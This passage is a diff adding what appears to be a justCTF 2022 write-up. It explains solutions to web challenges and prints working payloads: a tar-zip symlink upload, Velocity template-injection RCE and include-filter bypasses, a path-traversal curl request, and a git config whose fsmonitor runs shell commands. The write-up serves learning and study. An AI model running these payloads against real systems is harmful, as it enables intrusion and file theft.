@@ -1,0 +1,239 @@
+```
+ln -fs ../../../flag.txt .
+touch a
+zip a.zip -xi a
+tar --owner 0 --group 0 -cvf payload.tar flag.txt a.zip
+
+curl -v ${1:-symple-unzipper.web.jctf.pro}/extract -F 'file=@payload.tar'
+```
+
+From the discussion in discord, it seems that after doing the above, the file header is in tar format, and the end is the zip file you packaged. The implementation of `is_zipfile` will cause this type of file to pass (it seems to check the magic byte first, and if it cannot be found, it will be judged in other ways), so it is judged as true, and then it will be decompressed by the `extract_archive` below, and then your symlink will be preserved.
+
+## Velociraptor(22 solves)
+
+This challenge is Velocity's SSTI. If you search online, you will find this RCE payload:
+
+``` java
+#set($e="e")
+$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("touch /tmp/rai4over")
+```
+
+But this challenge locked it, so it cannot be used. The flag is in the root directory, so you don't need RCE, just need to be able to read the file. Velocity has an `include` command:
+
+```
+#include( "/flag.txt" )
+```
+
+But if you use it directly, it will give you an error:
+
+> Malicious input detected (#include, #parse)
+
+You need to find a way to bypass it. I saw someone do it this way on discord:
+
+```
+#set($x="#includ")
+#set($y='e("/flag.txt")')
+#set($a="$x$y")
+
+#evaluate($a)
+```
+
+And someone used unicode to bypass it:
+
+```
+#set($x="#includ\u0065('/flag.txt')")
+$x
+```
+
+## GoBucket(18 solves)
+
+The core code of this challenge is as follows:
+
+``` go
+r.HandleFunc("/files/{bucketId}/{filename}", handleBucket)
+
+bucketPath := filepath.Join("./buckets/", bucketId)
+// [...]
+filePath := filepath.Join(bucketPath, filename)
+```
+
+After matching the URL to the `bucketId` and `filename`, concatenate the path and get the file. Our goal is the `buckets/secret_file` file.
+
+The solution is:
+
+```
+curl --path-as-is 'http://gobucket.web.jctf.pro/files/\/secret_file'
+```
+
+From the discussion, it seems that golang does not turn `/\/` into `///` when processing URL matching, so `\` becomes a parameter, and when constructing a filepath, it can potentially be dangerous as it allows you to skip/escape a directory.
+
+## gitara(12 solves)
+
+The code for this challenge is as follows:
+
+```
+ <?php
+
+if (!isset($_POST['domain']) || preg_match('/[^a-z0-9.-]/ims', $_POST['domain']) !== 0) {
+    highlight_file(__FILE__);
+} else {
+    $dir = '/tmp/gitara'.rand();
+    mkdir($dir);
+    system(" \
+cd $dir && \
+timeout 2s sshpass -phunter2 scp -o StrictHostKeyChecking=no 'justctf-gitara@$_POST[domain]:*' . && \
+timeout 1m git status; \
+rm -rf $dir");
+}
+```
+
+The goal is actually quite clear: the chall server will use scp to copy files from your server and then execute `git status`, so you need to use some of git's features to achieve RCE.
+
+At the time, a teammate posted this config:
+
+```
+[core]
+    repositoryformatversion = 0
+    filemode = true
+    bare = false
+    logallrefupdates = true
+    fsmonitor = "echo \"Pwned as $(id)\">&2; false"
+```
+
+There seems to be a fairly complete explanation here: [2022_git_buried_bare_repos_and_fsmonitor_various_abuses.md](https://github.com/justinsteven/advisories/blob/main/2022_git_buried_bare_repos_and_fsmonitor_various_abuses.md), but it's a bit long and I haven't read it yet.
+
+In short, if you replace the gitconfig with the above content and then use `git status`, the command after fsmonitor will be executed.
+
+However, the difficulty of this challenge is not in this, but in how to throw a git repo onto the chall server.
+
+When you use `git init`, a `.git` folder will be added to the directory, which contains:
+
+1. HEAD
+2. config
+3. description
+4. hooks/
+5. info/
+6. objects/
+7. refs/
+
+However, the command during scp is `server:*`, so:
+
+1. Hidden files starting with . will not be matched
+2. Folders will not be downloaded because -r is not used
+
+After discussing with my teammates for a while, I found that if you adjust the config, you can reduce it to only four files and you don't need the `.git` folder:
+
+```
+[core]
+    repositoryformatversion = 0
+    bare = false
+    worktree = ./
+    fsmonitor = "echo \"Pwned as $(id)\">&2; false"
+```
+
+The file structure is as follows:
+
+```
+drwxr-xr-x  6 huli  staff  192  6 14 22:00 .
+drwxr-xr-x  3 huli  staff   96  6 14 21:57 ..
+-rw-r--r--  1 huli  staff   23  6 14 21:57 HEAD
+-rw-r--r--  1 huli  staff  115  6 14 21:59 config
+drwxr-xr-x  4 huli  staff  128  6 14 21:57 objects
+drwxr-xr-x  4 huli  staff  128  6 14 21:57 refs
+```
+
+Executing `git status` in the subdirectory will run the fsmonitor command.
+
+However, the objects and refs folders must exist. I tried to replace them with files, but the check failed. Later, I went to look at the git source code to see how it was checked. The relevant code is here:
+
+https://github.com/git/git/blob/master/setup.c#L341
+
+``` c
+/*
+ * Test if it looks like we're at a git directory.
+ * We want to see:
+ *
+ *  - either an objects/ directory _or_ the proper
+ *    GIT_OBJECT_DIRECTORY environment variable
+ *  - a refs/ directory
+ *  - either a HEAD symlink or a HEAD file that is formatted as
+ *    a proper "ref:", or a regular file HEAD that has a properly
+ *    formatted sha1 object name.
+ */
+int is_git_directory(const char *suspect)
+{
+	struct strbuf path = STRBUF_INIT;
+	int ret = 0;
+	size_t len;
+
+	/* Check worktree-related signatures */
+	strbuf_addstr(&path, suspect);
+	strbuf_complete(&path, '/');
+	strbuf_addstr(&path, "HEAD");
+	if (validate_headref(path.buf))
+		goto done;
+
+	strbuf_reset(&path);
+	get_common_dir(&path, suspect);
+	len = path.len;
+
+	/* Check non-worktree-related signatures */
+	if (getenv(DB_ENVIRONMENT)) {
+		if (access(getenv(DB_ENVIRONMENT), X_OK))
+			goto done;
+	}
+	else {
+		strbuf_setlen(&path, len);
+		strbuf_addstr(&path, "/objects");
+		if (access(path.buf, X_OK))
+			goto done;
+	}
+
+	strbuf_setlen(&path, len);
+	strbuf_addstr(&path, "/refs");
+	if (access(path.buf, X_OK))
+		goto done;
+
+	ret = 1;
+done:
+	strbuf_release(&path);
+	return ret;
+}
+```
+
+But I didn't see any clues, and I didn't solve this challenge.
+
+After the game, I found out that I missed a detail: `access(path.buf, X_OK)`. Here, only the X of the file is checked, so if you add x to the file using `chmod +x`, the check can be passed. Therefore, you can successfully build a legal git repo without any folders.
+
+But what I learned from this challenge is not just that. There is also a discussion on [discord](https://discord.com/channels/656258740252704788/978311401439363112/985624467810189367), where the author thought that the `.git` file was needed, but `:*` in scp does not match this file, what should I do?
+
+The answer is: "Change your own server's scp", like this:
+
+```
+root@ip-172-31-28-181:/usr/bin# cat scp
+#!/usr/bin/bash
+/usr/bin/scp.orig -f .git HEAD config elf objects refs
+```
+
+Why does this work? This is related to the principle of scp.
+
+I originally thought that scp was a program that could help you fetch remote files through ssh. Later, I learned that your server also needs to install scp, and scp will communicate with each other as both a server and a client. This means that when I execute `scp remote:* .` on my machine, it is actually:
+
+1. Local scp executes ssh to connect to remote
+2. Local scp calls remote scp
+3. Remote scp sends the file list to local scp
+4. Local scp fetches the files
+
+In short, what files are matched is sent by remote scp using the `-f` flag, which is not documented. Therefore, we can see that the above solution overwrites scp, so you can decide which files to transfer.
+
+For more detailed introductions, please refer to:
+
+1. [SCP - Familiar, Simple, Insecure, and Slow](https://goteleport.com/blog/scp-familiar-simple-insecure-slow/)
+2. [粗析openssh 中scp代码逻辑](https://blog.csdn.net/an_zhenwei/article/details/7951527)
+3. [scp源码浅析](https://www.cnblogs.com/danxi/p/6680549.html)
+
+## Baby XSLeak(7 solves)
+
+This question has an English version, and I'm too lazy to write it in Chinese: https://blog.huli.tw/2022/06/14/en/justctf-2022-xsleak-writeup/
+
+In short, it uses the `onload` time of `<object>` to determine the size of the response. If there is more content, it should take more time to render, and the `onload` will trigger later.
